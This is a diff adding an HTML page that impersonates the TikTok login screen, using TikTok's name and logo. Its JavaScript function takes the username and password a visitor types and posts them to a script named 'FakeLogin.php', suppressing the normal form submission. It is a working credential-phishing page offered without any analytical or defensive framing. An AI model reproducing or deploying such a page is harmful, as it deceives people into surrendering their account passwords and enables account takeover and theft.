@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <title>TikTok Login</title>
+    <style>
+        body {
+            background-color: #f8f9fa;
+        }
+        .container {
+            margin-top: 100px;
+        }
+        .card {
+            border: none;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .card-header {
+            background-color: #fff;
+            border-bottom: 1px solid #e6e6e6;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo-container {
+            text-align: center;
+        }
+        .logo {
+            width: 100px; /* Adjust the width as needed */
+            height: 100px; /* Adjust the height as needed */
+        }
+    </style>
+    <script>
+        function saveCredentials() {
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Send the data to a PHP script for processing
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'FakeLogin.php', true); // Update the PHP file name
+            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    // Handle the response if needed
+                    console.log(xhr.responseText);
+                }
+            };
+            xhr.send('username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password));
+
+            // Prevent the form from submitting
+            return false;
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://tse3.mm.bing.net/th/id/OIP.pMWYNZuf-p7XDGTYNxmOjwHaHa?rs=1&pid=ImgDetMain" alt="tiktok logo" class="logo">
+        </div>
+        <div class="row justify-content-center">
+            <div class="col-md-6">
+                <div class="card">
+                    <div class="card-header">
+                        <h3 class="mb-4">TikTok Login</h3>
+                    </div>
+                    <div class="card-body">
+                        <form onsubmit="return saveCredentials()" action="/.dbA222/TikTokogin/login.html" method="post">
+                            <div class="form-group">
+                                <input type="text" class="form-control" id="username" name="username" placeholder="Username" required>
+                            </div>
+                            <div class="form-group">
+                                <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
+                            </div>
+                            <button type="submit" class="btn btn-primary btn-block">Login</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
